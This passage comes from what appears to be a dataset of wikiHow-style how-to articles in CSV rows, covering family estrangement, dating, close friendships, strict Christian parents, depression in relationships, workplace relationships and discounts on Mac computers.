Write a letter.",How to End All Ties With Your Family2," In most cases, it is best to let your family know that you are cutting ties with them. This does not need to be a long conversation, and you do not need to go into great detail. You may want to do this with a therapist or mediator present.For example, you might begin the conversation by saying, “I have something important I need to let you know. I have decided that, for my own mental health, it is best that I distance myself from this family for the time being. I have been doing my own work on some of the problems in our family, and right now, I see this as the best option for my life.”

, No matter how dysfunctional your family may be, try to the issue from their point of view. It is painful to feel powerless and lose a connection to any person, let alone a family member.


Try saying, ""I understand how painful this is for you. I am sorry that I am hurting you. But I feel that for right now, this is what I need to do.""

, Most likely, a decision to end family ties will not be received well. You are setting new boundaries with your family, and they will likely be angry or upset.They may demand more answers about why you are leaving than you are willing to give. Try saying, “I am not comfortable talking about that right now, but I will write a letter with that information when I am ready.”
They may insist that they will change and the situation will improve. You can say, “I am glad to hear you want to change. I would like to see you take some steps to make that happen, and then we can revisit this in six months.”
They may also be angry and defiant. They might say, “Fine. We don’t want you in this family, either.” You can respond, “I am sorry we feel the need for this distance,” and end the conversation.

, If you are too uncomfortable talking to your family directly, you can send a letter. This can also be a good option if you feel intimidated or at a loss for words around them.Writing a letter can help you clarify your own feelings.
Letter writing also allows you the time to search for just the right words to describe your feelings.
A friend or counselor can look over the letter before you send it and offer feedback.

Give yourself permission to set limits.,
Establish what kind of contact will be acceptable to you, if any.,
Hold up your end of the agreement.,
Be prepared for intrusions.,
Seek counseling.,
Be cautious in accepting offers of help.,
Be flexible.",How to End All Ties With Your Family3," Boundaries are important to relationships as well as your own self-respect. Consider it an important way to take care of yourself., Be clear and firm in establishing what is appropriate. Confusion will occur if you remain vague.Instead of “We can talk on the phone,” a clearer boundary would be “I will call you once a week.”

, Call them as scheduled or visit as you agreed to.


If you plan to visit your family, let them know when they can expect to see you. For example, “I need some space right now, but I will be back for Nana’s party in April. Maybe we can revisit some of these issues at that time.”

, Your family members may have a difficult time adhering to the boundaries you have established, particularly if they are distraught and seeking answers. You may feel tremendous pressure to engage them.


Don’t answer excessive phone calls or emails. If you said you would email once a week, you are under no obligation to do more than what you agreed to.
If they visit without your permission, ask them to leave. You can say, “I am sorry that you drove all this way to visit, but I am not ready to communicate with you right now. I will let you know when that is. For now, I ask that you leave.”
Keep in mind that your family will likely be angry with you for enforcing your boundaries., A supportive therapist will help you name, maintain, and validate your boundaries with your family.


A therapist can also help you work through other issues you are dealing with after cutting ties with your family, such as feelings of guilt, depression, and anger.A therapist can also recommend a support group that may be helpful to you.

, Accepting money from family is not good in the best of circumstances,but be cautious of opening the door for other offers of help as well. You may end up feeling indebted to them, and thus guilty that you haven’t been a “better” family member.

, If you see your family making some positive changes, be open to reconnecting with them. You can adjust your contact to your comfort level.


Reconnecting with your family may be painful as you revisit old wounds. Consider working with a family therapist. A family therapist will take the whole family system into account in order to give your whole family appropriate ways to heal."

Buy yourself some new clothes if yours are worn or outdated.
Work on maintaining your health by eating healthy and getting at least 150 minutes of moderate aerobic exercise every week.Make sure that you are giving yourself enough time to rest and relax each day.

, Sometimes, you may wish so desperately to fall in love that you're willing to put up with just about anything from the other person. Truly nice people respect each others' needs and boundaries. Before you go looking for love, make a commitment to yourself that you will respect your needs and desires.

, If you have dated some people in the past who did not treat you well, you will want to steer clear of other people who may do the same. As you are getting to know a potential boyfriend or girlfriend, take note of how the person treats you as well as other people. Is he/she aggressive? Rude? Pushy? Critical? Controlling? Or just plain mean? If so, you should think twice before dating this person.Look for positive qualities in the men/women that you choose to date. Try to find someone who is kind, polite, encouraging, supportive, and, above all, nice to you!

, To find a nice person, you may have to look in places other than your local bar. That does not mean nice people don’t frequent bars, it just means that you may have an easier time of finding a person who suits your interests and values if you look in other places as well. Consider looking for a nice person to love at a place where people like the one you're looking for tend to gather.


For example, you might have a higher chance of meeting a nice person at a charity event, volunteering at the hospital, or at the library. You may also consider being set up with a nice person by one of your friends or introducing yourself to someone who you often see reading at your neighborhood coffee shop., To indicate your interest in someone, you need to show that you are interested by doing a little flirting. You can use your facial expressions, body language, and comments to flirt. Using things like body language, eye contact, and flirtatious comments can help to show the other person that you are interested in them. In fact, research suggests that how you indicate your interest can be more effective at attracting a mate than physical appearance., As you indicate your interest to someone, watch for signs that they are also interested in you. Check to see if the other person is smiling, making eye contact, and standing with their body directed at you. Other positive signs include touching their hair, adjusting clothes, raising and lowering eyebrows, or a casual touch on the arm.Other signs of interest include biological responses that people can't necessarily control. For example, people may flush or blush when they are aroused. Their lips may also become plumper and redder.If someone does not seem interested in you, don’t waste your time. Just keep looking for a nice person to love.

, There are several ways to open a conversation with someone you've just met and you're romantically interested in. These are called ""opening gambits."" They may also be known as ""pickup lines"" or ""icebreakers."" However, you don't have to be creepy to use an icebreaker. Research suggests a few ways to use opening gambits to open a conversation:Direct. These openers are honest and clear about your intentions. For example, ""I think you're cute. Can I buy you a coffee?"" In general, men tend to like to receive these openers.
Innocuous. These beat around the bush, but are friendly and polite. For example, ""I'm new here. Would you recommend the cappuccino or the latte?"" In general, women tend to prefer receiving these openers.
Cute/flippant. These are the ""pickup""-type lines. They can be funny, cheesy, or even nasty. For example, ""Do you prefer your eggs scrambled or fertilized?"" In general, both sexes prefer the other gambits over these.
Since you're looking for a nice person to fall in love with, research suggests that you should go for something honest, friendly, and supportive. These are more likely to result in a long-term relationship., When you are first getting to know someone, it is important to avoid sharing too much about yourself too soon. It is common for some people share too much of themselves in the early stages of a relationship because they want to seem honest and forthright. But sharing too much too soon can also be overwhelming for the other person. It also makes you less mysterious, which is part of the fun of falling in love.For example, you should avoid discussing topics like your ex, your mean boss, or your personal finances.

, It is important to find out if you are compatible with this nice person (and if they really are nice). Ask open-ended questions to get to know them better and get a better feel for their personality.The questions that you ask early on should not be too invasive or too personal. They should be friendly and fun to discuss. For example, some questions you might ask on a first date include:Do you have any roommates? If so, what are they like?
Do you have any favorite books?
Are you more of a dog person, a cat person, or neither? Why?
What do you like to do in your spare time?

, Confidence and self-esteem are important factors in falling in love. People who have low self-esteem may have a hard time of falling in love because of feelings that they are unworthy. If you lack confidence, you may want to spend some time working on yourself before you try to get into a relationship. Or, you can try to fake confidence until you feel confident.For example, stand up tall, smile, and make eye contact with people. Doing so will give others the impression that you are confident and you may start to feel more confident just by acting this way. Someone who is nice should be very interested in finding a confident person to date, whereas a mean person may dislike this quality because you will seem harder to control.

, It is common for people to become so wrapped up in a new relationship that they stop doing things that matter to them. But not making enough time for you and your interests can be bad for you and bad for your new budding relationship. Remember to make enough time for you and your interests no matter how much you want to skip them to extra spend time with your new love interest.Maintaining your personal time should not be a problem for a nice person. Just be wary if the person gets upset at you for wanting some personal time. This may indicate that the person is not as nice as you thought.

, It is important to make your intentions known to this nice person if you want to continue seeing them. If you are enjoying spending time with the person, let them know. You don’t need to declare long-term intentions in the early stages of a relationship, but you do need to say that you enjoy spending time with the person and that you’d like to keep seeing them.Try saying, “I’ve had a great time on our last few dates and I’d like to keep seeing you if that is something you are interested in.”

, Once you've been dating for a while, it's time to start getting to really know this person. That means understanding what makes them tick, what their hopes and dreams are, and what they believe and value. These types of questions, especially if they involve the future, may also help the other person imagine you in their future life.Social psychologist Arthur Aron has developed a list of 36 open-ended questions that can help you start interesting, meaningful conversations with your partner. For example, ""What would constitute a perfect day for you?"" and ""For what in your life do you feel most grateful?""A nice person should be open to having a conversation like this one.

, Active listening is a process that builds mutual understanding and trust -- key components of falling in love. By developing your listening skills, you'll show your partner that you're really interested in what they're saying. This is important if you want to keep a nice person interested in you.Try labeling emotions. For example, if your partner tells you she had a bad day and needs to vent, reflect what you believe she's feeling, such as ""I'm sensing that you're feeling really upset.""
Ask probing follow-ups. Try asking questions such as ""What do you think would happen if you did.....?"" or ""What if you tried....?""
Validate the other person. Even if you don't necessarily agree with what your partner is feeling, acknowledge her feelings. Feelings can't be wrong or right -- they just are. For example, ""I can see where what I said would hurt your feelings. I appreciate your willingness to talk to me about it.""
Don't shrug things off. Although it could seem natural to you to jump to reassuring your partner with something like ""Don't even worry about that,"" this type of hasty reassurance can actually suggest that you haven't been listening. Take your time and offer meaningful comments.

, Communicating clearly and effectively will build the trust and interaction between the two of you, which will strengthen your emotional bonds and help you and your nice person to fall in love. Try some of these techniques:Ask questions. Don't assume that you know what's going on. Ask questions to clarify what the other person needs, especially if you don't feel certain. For example, if your partner seems upset, ask: ""It seems like you're really upset about this. Do you need to just vent, or do you want me to help you find a solution? I'm here for you either way.""
Use ""I""-statements. These help you avoid sounding blaming or judgmental, which can put the other person on the defensive. There will be times when you or your partner have to communicate something that has upset you or hurt your feelings, but using ""I""-statements will be effective and respectful. For example, if your partner is so nice that he'll never try to fix things that go wrong, try communicating how that makes you feel: ""When we go out to dinner and you do not ask our server to fix things that are wrong, I feel like you aren't standing up for my needs. Can we talk about how to address this?""
Avoid passive-aggression. You might feel like the ""nice"" thing to do is to hint at when you're angry, rather than come straight out with it. However, it is far better to be clear, direct, and honest about how you are feeling. Passive aggressiveness can break down trust and make the other person feel hurt or angry. Say what you mean and mean what you say. It's possible to be direct and kind at the same time., Your partner's family and friends probably have a great deal of influence over his or her life. Winning them over may just help the two of you fall deeper in love.Be polite and kind. But be yourself! You don't want to appear to be one way around your partner's family and friends and another way around the person you love. Be genuine with everyone.

Make that person a priority.",How to Develop a Close Relationship with Someone New," Initiate conversation about common interests, or questions about them. Whether in a group setting or one-on-one, begin on a lighthearted level.Consider using the F.O.R.D. technique, by focusing the conversation on the following topics: Family, Occupation, Recreation, and Dreams (Hopes).
See a conversation as two sided. Be interested in what others say, and be interesting by relating to others. Share stories, but allow others an opportunity to speak. Be friendly and personable.
Even if you’re more of an introvert than an extrovert, by simply being positive in the conversation, and showing genuine interest in what the person is saying, you are more likely to develop a closer connection.;
, It can be hard to develop a deep relationship with a group. Cultivating closer friendships and relationships often requires one-on-one settings. This may involve doing something outside of work, school, or home.Invite someone to lunch, coffee, or a hang-out spot.
Ask them to go on a hike or walk, or some other outdoor activity.
Go to a bar for drinks
If that person agrees, that’s a good sign that they are interested in also getting to know you, and giving you a chance. If they decline, they may be busy, or less interested in a close relationship.

, Getting out of your ordinary routine can often help you to be closer with someone. If the new person is interested in things that you normally would be less likely to try, consider trying it. New experiences can help you find new friends, and can possibly help you to be more open and interesting to others. Consider going out of your comfort zone in these ways:


Go to a local food festival rather than a restaurant.
Take a day trip to a local state or national park.
Go to a museum that's not so traditional, like a radio and television museum or a sports hall of fame.
Consider going to a local comedy show or a play rather than the movies.
Go to a sporting event that might be outside the usual.
Take a class together — art, fitness, cooking, or something else that seems different.

, Many successful romantic relationships are not just based on sexual compatibility, but also on a close friendship. It's important that the person you're dating makes you feel attractive and loved, but it's also key that you can communicate about important things.


Try online dating. This is an opportunity to meet a lot people, and see if you hit it off before meeting up in person.
Go to parties, events, and social gatherings with the goal of having one-on-one time with someone interesting.

, Consider doing activities on your own, without the people who you usually hang out with. Doing things independently may push you to talk more with new people, and get you to open up more than usual.


You're more likely to develop a relationship with someone new if you're not hanging out with a friend already.

, Don’t be distracted and trying to multi-task, especially when trying to have a closer relationship with someone new. They may see your lack of attention or focus as a sign that you are not interested in getting to know them. Consider these ways to show you’re interested in them:Actively listen. Give your undivided attention to the new person. Be present.
Keep eye contact and give non-verbal cues of understanding, such as saying ""uh-huh"" or nodding your head.
Paraphrase what they are saying, and give empathetic responses. Consider saying, “It sounds like you had a tough day after taking that final exam. I know it can be stressful. I just had a tough exam last week.”

, There is a level of comfort that is built through simply being in the same place, doing something together, and it's an important step toward reaching a place where it feels natural and safe to start having deeper conversations. When watching a movie together, for instance, you're not necessarily talking or relating, but you're having a shared experience and getting used to being in each other's presence.


Include the other person in your life. Invite them to group outings, sporting events, to join teams or clubs, or to hang out in the park.

, These topics should not likely be discussed the first time you meet someone new, but after you have established a one-on-one rapport with them. Being open to talking about painful topics can bring your closer to someone. Communicate your thoughts and feelings in a deep way. Trust someone new from time to time, as you may feel better in the long run. One of the most important topics can be about values and beliefs. By understanding and having a common bond over values and beliefs, you are likely to become closer to that person.
Stressors about upbringing and recent personal crises may lead to a deeper understanding, as sharing fears or insecurities can be difficult but also cathartic.
Consider asking questions like, ""What was it like for you as a kid?"" or ""Are you close with your parents?"" Finding out about someone's thoughts and feelings is key.

, Make sure both of you get to share what each wants to talk about, and give each person equal opportunity to speak their mind. One-sided conversations may make the new person feel underappreciated, or not important.


Deeper relationships are based on respecting each other, and valuing each other’s input.
Consider saying, ""That's what it has been like for me last week, what's it been like for you?"" or ""I want to hear what you've been going through.""
Giving someone the opportunity to speak without interruption is key.

, Being vulnerable may seem negative and can be scary, but it is actually a positive way to open yourself to a closer and deeper relationship with someone. Vulnerability involves revealing a part of yourself that is hard to talk about, but important to share with those your trust and is essential to building a close relationship.Learn to be emotionally honest. While this may be difficult in large group settings, it’s important to confide in people in smaller or one-on-one settings about your worries and fears.
Don’t dwell on the negative. Particularly if this is someone new, it’s important to focus on both the positive and negative, rather than just one or the other.
When someone asks you, ""How's your family?"" instead of saying, ""They're fine,"" be open about what is bothering you. You don't need to turn the conversation into a venting session, but it can help someone to see what you're going through. You could say instead, ""They're pretty well. My mom is sick, but we're all trying to pull together and support her.""

, Be a dependable friend or romantic partner. Don’t always put off calling or texting someone new due to other priorities. Make time for the special people in your life.


Being reliable is a key way to build trust. It shows that you do what you say, and that your words are not empty promises.
Don't play games with someone you like, or possibly love. Be there for them.
Make an effort to be on-time, or follow through with plans. You will lose someone’s trust if you fail to “honor your word.”
For example if you know that you'll be running late, be courteous and call or text the person you're meeting. And, if it's likely that you can't make an event, tell them at least 24 hours ahead of time.

, When you make someone a priority, by calling them back in a timely manner, showing up to a scheduled event on-time, or giving your undivided attention, this will make a big impact on how close you are with that person. Make someone feel valued. If you show through your words and actions that this person is both interesting and important, it is likely that the person will respond the same way. Treat others as you would like to be treated.
If this is a romantic relationship, let someone know you're thinking of them. While it's important to have boundaries in any relationship, fostering love by making someone feel special is key.
Consider giving a small gift for special occasions, or even just for times when you think they really could use the support.
Offer your help if they are stressed, worried, or in need of some assistance. Being handy and helpful can make a big difference in a relationship.

Understand where they're coming from.,
Evaluate yourself and your parents and answer these questions:


Do your parents love you despite their rules?,
Give them some benefit of the doubt.,
Look at your own reactions.,
Consider whether you're actively ""rebelling"".,
Try to find middle ground.,
Figure out who you are.,
Strive to find that middle ground any time you clash with them.,
No matter what, obey your parents.,
Talk to them about how you feel.,
Change your outlook on life.",How to Deal with Strict Christian Parents," Strict parents are hard to deal with, but if you add the word 'Christian' on top of that, particularly if you don't share their faith, you may struggle with their decisions. Their rules may seem unfair and unnecessary to you. The first step to overcoming this obstacle is by realizing what your parents are doing. If they're setting harsh rules, Christian parents are just doing what they feel is right as parents and within their faith. Sometimes it seems that they are overreacting and surrounding you with prison walls, but they are just trying to create Godly boundaries.;
,
Do they make an effort to teach you about God?
Do you feel like they think they are trying their best to raise you?

, Parents who parent based on their faith are just doing what they feel is best. Christian parents don't always get it right, but they think they are. Once you realize that they aren't on a mission to hurt you, life will be significantly different.

, How are you reacting to everything? These questions may require an honest evaluation of your life.


Are you becoming more reserved and spiteful to your parents every time they bring another rule into your life?
Do you feel like you are growing to hate them?

, Are you becoming more rebellious just because of how they are reacting to situations? Becoming rebellious just leads to stricter rules. Your parents are not prison guards. You will never be able to completely change your parents. You can just change you. The way you react to your parents requires maturity and a lot of self evaluation.


If you have come to the conclusion that you are becoming more rebellious due to your parents' rules, think about how that might affect you in the long term. Your parents have got you by a collar like a dog. Once a dog, who is always kept on a leash, is free- he is gone. He is gone forever. Running and free. If you are like the dog, you would have been kept on restrictions. You are living in an extremely tight Christian environment. That's an extreme. Once you're free: you'd be living in another extreme. You wouldn't have found middle ground.

, Chances are, you don't want to live in the other extreme of life. Your parents are still going to be in control of you because you are reacting to their restrictions. Making choices just because they conflict with the ones your parents would make isn't forming your own path.


As you grow and gain independence, you'll be free to pick and choose parts of their lifestyle that you like and don't like, compromise with them, and maybe even find some parts of their parenting techniques that you agree with. Finding and being open to that middle ground is likely to lead to better relations and a more fulfilling life than if you just make all your decisions based on rebellion.

, Mentally isolate everything that your parents are and isolate everything that you wish you could be in the extreme. Figure out what you want in your future.

, Trying to find a middle ground in the midst of extremes is like describing a place that you've never seen. What are you supposed to? If your parents say no to a party with some wild friends  your instant response will be to sneak out to it. That's your extreme nature kicking in. Stop, think about it, and figure out what you really want. Do you want to be going off to the party because your parents don't want you to, or do you really feel as if this is the life you want to be living later on?


Find circumstances while you are still in the house where you can imagine yourself making decisions on your own. You can't make decisions yet, because you are living in such a strict house, but you can imagine your own reactions to situations.

, This may not seem easy, but in the end, they are still your parents. As a Christian child, it's your responsibility to honor your parents and love them even in the hard times.

, They may or may not listen. If nothing changes, just know that you won't be in their house forever. You will soon be out and living on your own. You can look forward to that.

, Look positively at the situation. Know that they love you, they want what's best for you, they just are struggling to figure out a way to achieve that. Love them anyway.

Look for symptoms of depression.,
Consider how long you have seen symptoms.,
Look for changes in sleep habits.,
Ask about feelings of hopelessness.,
Notice how the person is performing at work or school.,
Examine your sex life.,
Avoid isolation, which contributes to loneliness.",How to Deal with Depression in a Relationship1," Many people confuse depression with ""feeling down,"" but it is more serious than simply feeling sad or upset. Depression may express itself in a variety of ways, depending on the person experiencing it, and not everyone will have every symptom. However, in general, you should watch for any of the following:Frequent, consistent feelings of sadness, anxiety, or emptiness (aka ""depressed mood"")
Feelings of hopelessness or pessimism
Feelings of guilt, worthlessness, or helplessness
Loss of interest in activities and things the person used to enjoy
Fatigue or exhaustion; generally feeling ""slower"" (aka ""psychomotor retardation"")
Changes in sleep habits (either sleeping too much or sleeping too little, or insomnia)
Changes in eating habits, appetite, or weight
Restlessness or irritability; feeling ""keyed up"" (aka ""psychomotor agitation"")
Unexplained physical symptoms (e.g., body aches that don't have a medical cause)
Thoughts of death or suicide;
, There are multiple forms of clinical depression, and they vary in severity and duration. To count as having a ""major depressive episode,"" the person must have had at least 5 symptoms during a two-week period, and one of those symptoms must be either ""depressed mood"" or ""loss of interest or pleasure.""Minor depression: Symptoms may be less severe, and may not last as long.
Dysthymia or dysthymic disorder: Symptoms are less severe, but last for much longer (at least two years)
Major depression: Symptoms are severe and interfere with your daily ability to function and enjoy life.

Postpartum depression: This may occur shortly after a woman gives birth. It's natural to feel the ""baby blues"" for a few weeks, but if symptoms last longer than that, it is likely postpartum depression., Both hypersomnia, a desire to sleep too much, and insomnia, difficulty falling or staying asleep, can be symptoms of depression.These symptoms can have a significant impact on romantic relationships. In the case of hypersomnia, a partner's desire to sleep excessively may feel like s/he is avoiding or rejecting you. For partners who live together, insomnia may also feel like avoidance or rejection, as sleeping together is likely one way of expressing intimacy.


If your partner is experiencing either of these problems, don't take it personally. Ask what you can do to help and otherwise maintain your own sleep habits.
If you are suffering from either of these conditions, be mindful of how it may be impacting your partner. Reassure him or her your need for or inability to sleep is in not related to your feelings for him or her.
If your partner's sleep habits have changed but s/he doesn't know why, and you have observed other symptoms, try gently suggesting that it might be depression. Tell him or her, ""I know you've been under a lot of pressure lately, which can be overwhelming. Do you think your sleep problems might be a sign of depression?""

, If you notice you or your partner seem to respond negatively to most things and lacks motivation, inquire about underlying feelings. Hopelessness can sap your motivation, and everything feels pointless when you can't imagine circumstances ever improving.This may lead to disinterest in most activities.


This may come off as disinterest in your partner. Consider participating in activities with your partner, even if they seem futile. You might at least appreciate the distraction from your feelings.
If you notice your partner has lost interest in doing things you usually enjoy, and especially if you notice a pattern, ask him or her why s/he does not want to participate. If he or she gives a generic answer, or avoids the conversation, try saying ""I'm really concerned about you. You don't seem to want to do the things you used to like to do. Please talk to me so I can understand what is going on. I want to help you.""

, One way to recognize whether someone may be depressed is to examine his or her performance at work or school. If you see signs of grades or work performance deteriorating, an increase in the stress the person feels about school or work, or it seems like the person is putting in less effort than usual, talk to him or her.More severe depression may make it feel impossible to perform at school or work. If the person seems not to care about poor performance, misses school or work, or becomes argumentative when you ask about school or work, suggest looking for professional help.

, Depression often kills a person's sex drive, as well as pleasure in many other activities that s/he used to enjoy.If your sex life with your partner has changed dramatically from how it usually is, it may be a sign of depression.


Some antidepressant medications may also contribute to a low libido, so it's important to encourage your partner to talk to the doctor about his or her sex drive., Lack of energy and motivation often leads to depressed people feeling more lonely and isolated. With less energy and diminishing experiences of pleasure, depressed people tend to opt out of social activities.Friends and family begin to reach out less, anticipating being turned down. This becomes a worsening cycle.If your partner is depressed, it is important to encourage her or him to tend to relationships with family and friends to prevent isolation.
If your partner seems to be avoiding others, try to start a dialogue about the reason s/he is avoiding socializing. Tell him or her, ""I've noticed you haven't gone out with your friends in awhile."" S/he will probably respond that s/he just hasn't felt like going out. Then tell her or him ""I'm worried about you, and maintaining social relationships is important. I'll clean up the house and then find something to do if you'd like to invite your friends here.""
Don't become angry or confrontational. Try to avoid language that sounds blaming, such as ""What's with you?"" or ""What is your problem?"""
"
Be clear in your intent.,
Introduce yourself.,
Do not try to take over operations unless of you are in a position of leadership.,
Be open to new ideas and constructive criticisms.",How to Develop Work Relationships1," When developing new work relationships, it is very important to be both open and honest. Whether you are starting a new job, transferring to a new department or simply working on a new project, you want to make sure that you do not come to the table with an air of self-importance and superiority. No matter how well you know your job, arrogance is a sure way to create tension among your coworkers.;
, If you are new to the company, you will be given the opportunity to make your introductions. Take that time to talk about what makes you qualified to get the job done. Then leave it behind you. Do not use your qualifications and past experiences as a crutch, or reason for why you do not need to take the time to learn your new position. You may have vast experience in general but most companies have a unique way of doing things.

, However, if you are in a position of leadership, you still need to spend much of your initial time listening instead of talking. This is not a time to be self-absorbed. Listen to those working under you and hear what they have to say about the changes that they want to see. Let them know that you are working in their favor and that you are not there to make things harder on them.

, Chances are that while you bring your own skill set as an offering to the company, you can learn a few things in the process. For example, if you are going into a technical support position, you may know the basics on how to fix a computer and its components. The company may have its own methods that can make that job easier. No one can profess to know everything. Be open to learning new things and do not take offense to feedback that can make you a better worker.

Decide who to talk to about the depression.,
Be prepared to answer questions.,
Enlist the help of your doctor or therapist.",How to Deal with Depression in a Relationship2," You may be uncomfortable sharing information about your partner's or your own mental health. Not everyone needs to know. Think about how a person will respond to the information before you disclose. You may not want to tell an employer who has not been supportive in the past. Only share when you feel safe and supported.


Start with the people you believe will be the most supportive. This will boost your confidence and create a buffer if you have to disclose to those less supportive later. Talk to your partner and make decisions about who should be told before you disclose to anyone other than a doctor or clinician.
If your partner is suffering from depression, it's very important you not disclose without his or her consent. Disclosing without consent may contribute to feelings of helplessness and worthlessness.

, A lot of people don't understand depression, so you may need to educate them. You can find resources online or ask your doctor for brochures to help you explain what you are experiencing. Family and friends will probably want a description of your symptoms to better understand what you or your partner is experiencing. They may also have questions about what might have caused the depression and how it can be treated.You might try writing out answers to these common questions, so you feel prepared when you disclose to others.


Friends and family will probably also ask what they can do to help, so take this opportunity to ask for emotional support.

, If you are struggling to talk to friends and family about depression, ask a professional for advice. Doctors and clinicians have to talk to people about diagnoses all of the time, so they have lots of insight. Because your doctor is familiar with your specific case s/he may have really great suggestions. You might even consider inviting a friend or family member to your appointment so s/he can ask questions in an environment that feels safe for you.


If your partner is suffering depression and isn't talking about it, consider asking your doctor or clinician to speak with him or her. Knowing you trust the person may help him or her to open up.

Explore the great outdoors.,
Eat a healthy diet.,
Exercise to boost your mood.,
Have some fun together.",How to Deal with Depression in a Relationship3," Being in nature can improve your mood and will disrupt your a daily routine contributing to your depression. In addition to the mood boosting effects of simply witnessing the beauty of nature, compounds released by plants may chemically alter your mood.If your partner is depressed, plan outings, like picnics, to get her or him out of the house and into nature.
Hiking is a great way to combine the benefits of being in nature and exercise.

, Appetite changes associated with changes may be affecting both partners' eating habits, as couples often eat together. Establish a nutrient-dense diet that you both can benefit from. Some nutrients may help to improve mood, like B vitamins, so eat plenty of fruits and vegetables.Try cooking healthy meals together. This may be a creative activity you'll both enjoy.

, Physical activity increases endorphins to improve mood and has been shown to improve coping over time.Focus on physical activities you can do together to provide support and motivation for one another.


Consider activities that also include other techniques for improving mood for even greater benefit. For example, playing soccer with high school friends will allow you to exercise, socialize, and spend time having fun outdoors.
If highly structured activities are too overwhelming for you or your partner, try going for a walk together. This is an easy way to start increasing physical activity and get you out of the house.

, This serves as a distraction and quickly improves mood. A person who is depressed is often reluctant to initiate pleasurable activities.


If your partner is depressed, take the lead and plan a couple of fun activities each week.
If you are depressed, agree to participate in the activities, even if you aren't very excited about it. Realize your partner put a lot of effort into planning the activity because s/he cares about you.

Maintain outside relationships.,
Participate in group activities.,
Hang out in public places.",How to Deal with Depression in a Relationship4," Whether it's you or your partner suffering from depression, it's important you both maintain friendships in addition to your partnership. The depressed partner may feel like a burden without regular breaks, and the other may begin to feel trapped. Taking a step away occasionally will help both partners feel refreshed.Scheduling weekly social activities may obligate you to engage socially. Try setting up a weekly dinner date with your best friend. This will get you out of the house, foster a supportive relationship, and give you a healthy break from your partner.

, This is a good way for you and your partner to engage others socially together. Gather with family and friends regularly to maintain relationships and focus on something other than the depression.


Consider joining a club or volunteering at a local organization together. This will provide excellent opportunities to spend time together, without focusing on the depression, and make new friends, adding to your support system.

, Seeing other people happy may actually boost your mood.At the very least, other patrons will provide a distraction and give you something to talk about.


Coffee shops tend to be great for people watching, and outside venues may also provide the added mood boosting effects of nature.

Follow your doctor's instructions.,
Talk to a therapist.,
Join a support group.",How to Deal with Depression in a Relationship5," In some cases of depression, a doctor may prescribe medication. You and your partner should discuss all treatment options with a medical doctor and/or mental health professional. If you decide medication is appropriate for you, follow all instructions and consult your doctor before you stop taking the medication. Suddenly stopping some medications can be dangerous and may increase the risk of suicide.If your partner is prescribed medication, encourage him or her to take it regularly and avoid stigmatizing the use of prescribed medication. If your partner is made to feel shame regarding the need for medication, s/he will be less likely to comply with treatment.

, Both couple's counseling and individual therapy would be beneficial. Couple's counseling will help you to address issues in the relationship together. Individual therapy would benefit the depressed partner by allowing her or him to focus on healing, without immediate concern for the other, and help the non depressed partner develop healthy coping strategies for dealing with other's depression.


If you have insurance, consult your provider to find affordable treatment options. You can also research clinicians online.Many communities have clinics that provide low-cost or sliding-scale fee services for people on low incomes. Ask your doctor, nurse, or even religious figure whether they know of any services like this in your area.

, This will provide a social support system, as well as a safe place to discuss your relationship and experience with depression. Other members will be able to provide insight and encouragement.


If you aren't able to join a group in-person, consider one online."

Deliver you message clearly.,
Address any problems right away.,
Do not be resistant to congratulating a job well done.",How to Develop Work Relationships2," Communication is key in any successful relationship. We have all heard this several times through life but this is a statement that applies more than the average cliché. When the lines of communication are not kept open, you will find yourself in a situation where you may have feelings of mistrust and resentment. As human beings with different outlooks and personalities, it is easy to misconstrue the message that we are getting from another person. It is also just as easy for another to mistake your good intentions for something else. These pent up feelings and grudges are not productive in the workplace. The lack of communication is often the number one culprit in the failure to complete projects.

, When addressing any work-related issue, you want to take care not to be confrontational, as that in turn causes the other person to become defensive. Make a suggestion or offer a solution as opposed to simply telling them what they are doing wrong. It is not a character flaw to make a mistake. In other words, do not attack the character of your coworker. Make a suggestion about how the job can be made easier. Remember, it is not always what you say but how you say it.

, If you are in a position of leadership, or just working with a great coworker, let him know that his efforts are appreciated and that you recognize that they have done a superb job playing a key role in the success of the group or organization. Praise is always well received, and often appreciated when coupled with constructive criticism.

Be appropriate for the occasion.,
Avoid mixing personal with professional.,
Maintain neutral subjects.",How to Develop Work Relationships3," Your coworkers will respect a person that can keep things professional and that has the best interest of the organization in mind at all times.

, When you spend a significant portion of each day in the workplace, it is very easy to bring personal problems and issues to the office with you. While venting to a closer coworker is fine on occasion, keep things professional. Do not make it a habit of discussing your personal issues with colleagues or bragging about your personal life at work; this is not professional and it can taint your image. A person who portrays himself or herself as a womanizer or a ""man eater,"" respectively, will not always yield the impression of a trustworthy businessperson.

, Be careful of the jokes you tell and the nature of the conversations you have in the workplace. Do not make jokes concerning race, sexuality, politics or other taboo subjects in the workplace. No matter how entertaining you may think you are being, you run the risk of offending your colleagues.

Choose a model.,
Get an educational discount if possible.,
Shop for refurbished computers.,
Check for clearance products.,
Look for quality used computers.,
Find cheaper new computers.,
Compare close offers between resellers.,
Install extra RAM yourself.,
Consider buying hard drive space separately.,
Be careful with third-party laptop chargers.",How to Buy a Mac Computer at a Discount," If you're only interested in the latest models, compare them with Apple's online tool. For older models, check out buyer's guides from Mac Rumors and similar sites.


If you're new to Macs, visit a physical Apple Store for personal assistance. Just don't be tempted to buy on the spot — there are better deals.
Apple tends to release new computer models every six months or less. If the current model has been around a few months, wait for an update. The ""old"" model will drop in price.;
, Current or incoming college students get a major discount, as do faculty and staff at any school. Visit the online education store to get the cheaper price. After you choose a product and enter payment info, Apple will send you to another site to verify your status for free.


You'll need proof of your educational status (typically a student or staff ID). If you do not have this, call or visit an Apple Store for advice.Look for summer back to school deals. Apple usually throws in a free $100 gift card to the App Store., Refurbished computers were returned to Apple due to some defect, but have since been fixed and tested thoroughly. Most are identical to a brand new computer, and with free returns you can't really go wrong. They're typically between 10% and 20% off, but you can only choose from a limited selection.


Remember to check the exact model of each computer. An older model can save you some money, but make sure it has the specs you need.

, Apple does have clearance sales, but they're not common. Check them out from time to time and you might get lucky.

, Apple does not allow other sellers to use the term ""refurbished.""This means ""used"" Apple computers range from dented bricks to fully repaired beauties. PowerMax and Simply Mac are two sellers that offer ""used"" computers that are often as good as new.Used computers may lack the original packaging and manual.
You can find cheaper deals on other sites, but check for Apple certification and good customer reviews before you buy.

, Even if none of the discount options above are right for you, you can save money just by shopping around. The Apple Store almost always lists the highest prices. Instead, browse authorized apple resellers such as MacMall or Mac Connection, and larger retailers such as Best Buy.


Apple has approved sellers with an ""Apple Authorized Reseller"" title. Stores that offer excellent guidance earn ""Apple Specialist"" status.
Search the store's online site first for discount offers. If you decide to visit in person, print out the online deal and take it with you.

